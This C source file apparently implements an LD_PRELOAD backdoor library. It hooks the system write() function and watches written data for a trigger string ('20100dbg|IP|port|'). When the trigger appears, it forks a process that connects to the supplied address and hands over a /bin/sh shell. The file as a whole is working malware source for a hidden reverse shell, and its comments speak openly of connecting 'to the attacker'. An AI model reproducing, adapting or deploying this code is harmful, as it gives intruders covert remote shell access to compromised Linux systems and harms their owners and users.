//gcc -ldl badlib.c -fPIC -shared -D_GNU_SOURCE -o badlib.so

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <dlfcn.h>
#include <string.h>
#include <fcntl.h>

#include <sys/types.h>
#include <sys/socket.h>
//#include <netinet/in.h>
#include <arpa/inet.h>

void shell(char *ip, char *port);

ssize_t write(int fd, const void *buf, size_t count)
{
    //get a reference to the real write() syscall
    ssize_t (*old_write)(int fd, const void *buf, size_t count);
    old_write = dlsym(RTLD_NEXT, "write");

    int result;

    //I had to copy the buffer into a new one to avoid a compiler warning
    //but maybe we can do something else
    char newbuf[count];
    memmove(newbuf, buf, count);

    //if "20100dbg" is inside the buf, we start a shell
    if (strstr(newbuf, "20100dbg") != NULL)
    {
        //expected format : 20100dbg|IP|port|xxxxx
        char *token = strtok(newbuf, "|"); 
        char *ip = strtok(NULL, "|");
        char *port = strtok(NULL, "|");

        //we fork so the shell start in another process and this one can finish normally
        pid_t fid = fork();
        if (fid == 0) shell(ip, port);
        //if (fid == 0) shell("127.0.0.1", "9001"); //just test thing
        
        result = count;
    }
    else
    {
        //if 20100dbg is not in the buffer, copy as normal
        result = old_write(fd, buf, count);
    }

    return result;
}


void shell(char *ip, char *port)
{
    //create socket and sockaddr_in struct
    int sockfd = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in serv_addr;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(atoi(port));
    inet_aton(ip, &serv_addr.sin_addr);

    //lets connect to the attacker
    connect(sockfd, (struct sockaddr *)&serv_addr, sizeof(serv_addr));

    //redirect stdin, stdout, stderr
    dup2(sockfd, 0);
    dup2(sockfd, 1);
    dup2(sockfd, 2);

    //replace the current process with /bin/sh
    execve("/bin/sh", NULL, NULL);
    close(sockfd);
}